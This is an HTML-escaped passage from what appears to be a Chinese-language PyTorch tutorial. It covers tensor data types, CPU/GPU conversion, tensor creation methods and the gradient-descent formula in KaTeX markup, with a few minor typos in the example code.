&lt;td&gt;&lt;code&gt;torch.int32&lt;/code&gt; or &lt;code&gt;torch.int&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.IntTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.IntTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;64-bit integer (signed)&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.int64&lt;/code&gt; or &lt;code&gt;torch.long&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.LongTensor&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;&lt;code&gt;torch.cuda.LongTensor&lt;/code&gt;&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;通过&lt;code&gt;torch.ser_default_tensor_type(torch.FloatTensor)&lt;/code&gt;修改默认的类型。&lt;/p&gt;
&lt;p&gt;CPU与GPU类型的相互转换：&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;&amp;gt;&amp;gt;&amp;gt; torch.zeros([2, 4], dtype=torch.int32)
tensor([[ 0,  0,  0,  0],
        [ 0,  0,  0,  0]], dtype=torch.int32)
&amp;gt;&amp;gt;&amp;gt; cuda0 = torch.device(&#39;cuda:0&#39;)
&amp;gt;&amp;gt;&amp;gt; torch.ones([2, 4], dtype=torch.float64, device=cuda0)
tensor([[ 1.0000,  1.0000,  1.0000,  1.0000],
        [ 1.0000,  1.0000,  1.0000,  1.0000]], dtype=torch.float64, device=&#39;cuda:0&#39;)
# 从cpu –&amp;gt; gpu，使用data.cuda()即可。
# 若从gpu –&amp;gt; cpu，则使用data.cpu()。
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;requires_grad=Flase，可以先理解成在自动求梯度的过程中，对于该属性为False的tensor不会进行求解梯度。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;.shape属性，返回数据的尺寸&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如何创建一个tensor，主要有一下几种方法：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;
&lt;p&gt;从其它类型转换&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.from_numpy(np.array(2, 3.3))
# 从numpy转换 -&amp;gt; tensor([2.000, 3.300], dtype=torch.float64)

torch.tensor([2., 3.2]) 
# 从list转换，类型默认是torch.FloatTensor，可以通过torch.ser_default_tensor_type(torch.FloatTensor)修改默认类型
torch.tensor([2., 3.2], dtype=torch.float64)
# 或者创建时指定
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;未初始化Tensor&lt;/p&gt;
&lt;p&gt;生成未初始化的数据，数据分布十分不规律，后续一定要覆盖掉。例如Torch.FloatTensor(d1,d2,d3)。&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;注意&lt;code&gt;torch.Tensor()/torch.FloatTensor()&lt;/code&gt;接收的参数是shape维度，也可以接收现有的数据但必须是list，而&lt;code&gt;torch.tensor()&lt;/code&gt;只接收现有的数据，建议用&lt;code&gt;torch.tensor()&lt;/code&gt;用现有的数据创建，用&lt;code&gt;torch.Tensor()&lt;/code&gt;接收shape创建。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;随机初始化Tensor&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;a = torch.rand(3,3) # 3x3矩阵，每个都在[0,1]之间

torch.rand_like(a) # 会将参数a的shape送给rand函数

torch.randint(1,10,[3,3]) #min, max, shape

torch.empty(7, 19) # 创建7x19的矩阵

torch.randn(3, 3) # 3x3的矩阵，每个数据都符合N(0,1)的正态分布

torch.normal() # ?

torch.full([2,3],0) # 2x3的元素全部为0
&lt;/code&gt;&lt;/pre&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;h4 id=&#34;23-tensor常用方法&#34;&gt;2.3 tensor常用方法&lt;/h4&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;torch.reshape(input, (1, 2, 3, 4)) # 转换为四维
&lt;/code&gt;&lt;/pre&gt;
&lt;h3 id=&#34;3-梯度&#34;&gt;3. 梯度&lt;/h3&gt;
&lt;p&gt;导数和偏微分只能是描述的函数在自变量方向上的变化的情况，是一个标量；而梯度定义为一个向量，向量的每个元素是对不同的自变量的偏微分：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∇&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∂&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∂&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∂&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∂&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;.&lt;/mi&gt;&lt;mo separator=&#34;true&#34;&gt;;&lt;/mo&gt;&lt;mfrac&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∂&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;/mrow&gt;&lt;mrow&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∂&lt;/mi&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mi&gt;n&lt;/mi&gt;&lt;/msub&gt;&lt;/mrow&gt;&lt;/mfrac&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\nabla f = (\frac{\partial f}{\partial x_1}; \frac{\partial f}{\partial x_2}; ...; \frac{\partial f}{\partial x_n})
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.8888799999999999em;vertical-align:-0.19444em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∇&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:2.20744em;vertical-align:-0.8360000000000001em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.3714399999999998em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;∂&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;∂&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.3714399999999998em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;∂&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;2&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;∂&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mopen nulldelimiter&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mfrac&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:1.3714399999999998em;&#34;&gt;&lt;span style=&#34;top:-2.3139999999999996em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;∂&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.151392em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;n&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.23em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;frac-line&#34; style=&#34;border-bottom-width:0.04em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;top:-3.677em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:3em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord&#34; style=&#34;margin-right:0.05556em;&#34;&gt;∂&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.8360000000000001em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose nulldelimiter&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;一般我们需要用梯度函数的极值点，通常是是极小值，用到的公式就是：&lt;/p&gt;
&lt;p class=&#39;katex-block&#39;&gt;&lt;span class=&#34;katex-display&#34;&gt;&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;msub&gt;&lt;mi&gt;θ&lt;/mi&gt;&lt;mrow&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/mrow&gt;&lt;/msub&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;θ&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;−&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;α&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mi mathvariant=&#34;normal&#34;&gt;∇&lt;/mi&gt;&lt;mi&gt;f&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;θ&lt;/mi&gt;&lt;mi&gt;t&lt;/mi&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;\theta_{t+1} = \theta_t - \alpha_t\nabla f(\theta_t)
&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.902771em;vertical-align:-0.208331em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;θ&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.301108em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;span class=&#34;mbin mtight&#34;&gt;+&lt;/span&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.208331em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mrel&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2777777777777778em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:0.84444em;vertical-align:-0.15em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;θ&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mbin&#34;&gt;−&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.2222222222222222em;&#34;&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.0037em;&#34;&gt;α&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.0037em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;∇&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.10764em;&#34;&gt;f&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.02778em;&#34;&gt;θ&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.2805559999999999em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:-0.02778em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mathdefault mtight&#34;&gt;t&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mclose&#34;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;示例：&lt;/p&gt;
&lt;p&gt;例如求一个函数&lt;span class=&#34;katex&#34;&gt;&lt;span class=&#34;katex-mathml&#34;&gt;&lt;math&gt;&lt;semantics&gt;&lt;mrow&gt;&lt;mi&gt;J&lt;/mi&gt;&lt;mo&gt;(&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;/msub&gt;&lt;mo separator=&#34;true&#34;&gt;,&lt;/mo&gt;&lt;msub&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msub&gt;&lt;mo&gt;)&lt;/mo&gt;&lt;mo&gt;=&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;1&lt;/mn&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;mo&gt;+&lt;/mo&gt;&lt;msubsup&gt;&lt;mi&gt;x&lt;/mi&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;mn&gt;2&lt;/mn&gt;&lt;/msubsup&gt;&lt;/mrow&gt;&lt;annotation encoding=&#34;application/x-tex&#34;&gt;J(x_1, x_2) = x_1^2 + x_2^2&lt;/annotation&gt;&lt;/semantics&gt;&lt;/math&gt;&lt;/span&gt;&lt;span class=&#34;katex-html&#34; aria-hidden=&#34;true&#34;&gt;&lt;span class=&#34;base&#34;&gt;&lt;span class=&#34;strut&#34; style=&#34;height:1em;vertical-align:-0.25em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord mathdefault&#34; style=&#34;margin-right:0.09618em;&#34;&gt;J&lt;/span&gt;&lt;span class=&#34;mopen&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 mtight&#34;&gt;&lt;span class=&#34;mord mtight&#34;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-s&#34;&gt;​&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.15em;&#34;&gt;&lt;span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;mpunct&#34;&gt;,&lt;/span&gt;&lt;span class=&#34;mspace&#34; style=&#34;margin-right:0.16666666666666666em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;mord&#34;&gt;&lt;span class=&#34;mord mathdefault&#34;&gt;x&lt;/span&gt;&lt;span class=&#34;msupsub&#34;&gt;&lt;span class=&#34;vlist-t vlist-t2&#34;&gt;&lt;span class=&#34;vlist-r&#34;&gt;&lt;span class=&#34;vlist&#34; style=&#34;height:0.30110799999999993em;&#34;&gt;&lt;span style=&#34;top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;&#34;&gt;&lt;span class=&#34;pstrut&#34; style=&#34;height:2.7em;&#34;&gt;&lt;/span&gt;&lt;span class=&#34;sizing reset-size6 size3 